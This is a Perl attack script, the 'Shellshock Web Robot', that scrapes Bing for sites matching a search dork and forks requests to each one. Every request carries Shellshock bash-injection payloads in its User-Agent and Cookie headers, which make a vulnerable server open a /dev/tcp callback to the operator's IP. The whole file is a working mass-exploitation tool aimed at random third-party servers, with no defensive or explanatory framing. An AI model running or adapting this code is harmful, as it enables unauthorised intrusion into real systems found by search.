#!/usr/bin/perl -io
# load modules
use LWP;
use URI;
use HTML::TokeParser;
use Term::ANSIColor;
print color 'red';

sub limpa() {

	my $cmd=0; 
	my $sys="$^O";
 
	if($sys eq "linux") 
	{
		$cmd="clear"; 
	} else {  
		$cmd="cls"; 
	}
	print `$cmd`;
}

sub banner() {
 print q{

  SHELLSHOCK WEB ROBOT
     Ninja Jiraia version...

                just another web bot example
}
}

my @config = (
	'User-Agent'=>'Mozilla/4.76 [en] (Win98; U)',
	'Accept'=>'image/gif,image/x-xbitmap,image/jpeg,image/pjpeg,image/png, */*',
	'Accept-Charset'=>'iso-8859-1',
	'Accept-Language'=>'en-US',
);

my $busca=$ARGV[0]; 
my $home=$ARGV[1];
my @url="";

print "Searching to: $busca\n";

if((!$busca)&&(!$home)) 
{ 
	banner(); 
	print "Please follow the example ./programm dork your_ip\n"; 
	print color 'reset'; 
	exit; 
}

if(($busca)&&($home)) 
{ 
	for($num=0; $num<=30; $num++) 
	{
		$url=URI->new('http://www.bing.com/search');
		$url->query_form( 'q'=>$busca,'go'=>'','filt'=>'all','first'=>$num.'1' );
		$navegador=LWP::UserAgent->new;
		my $resultado=$navegador->get($url,@config);
		$res=$resultado->content;
		$p = HTML::TokeParser->new(\$res);

		while ($p->get_tag("cite")) 	
		{
			my @link = $p->get_trimmed_text("/cite");

			foreach(@link) 
			{ 
				print "$_\n"; 
				push(@url,$_); 
			}
		}
 	} 


	my @payload_headers = (
		'User-Agent'=>"() { :;}; echo \"1\" > /dev/tcp/$home/51038 ",
		'Cookie'=>"() { :;}; echo \"1\" > /dev/tcp/$home/51038 ",
		'Accept'=>'image/gif,image/x-xbitmap,image/jpeg,image/pjpeg,image/png, */*',
		'Accept-Charset'=>'iso-8859-1',
		'Accept-Language'=>'en-US',
 	);

	limpa(); 
	banner();

	print "\n Send Headers payloads \n ";

	foreach(@url) 
	{
		$target=$_;
		$pid=fork();
		if (not $pid)
		{
			if($target !~ / /)
			{
				print "http://$target    send payload!\n";
				$addrx="http://$target"; 
				$url=URI->new($addrx);
				$ur=LWP::UserAgent->new;
				$ur->timeout(1);
  				my $resultado=$ur->get($url,@payload_headers);
			}
			exit;
		}
	}


	$line=scalar(@url);

	print "---------------\nTotal links $line \n"; 
	sleep 1; 
	print color 'reset'; 
	exit;
}
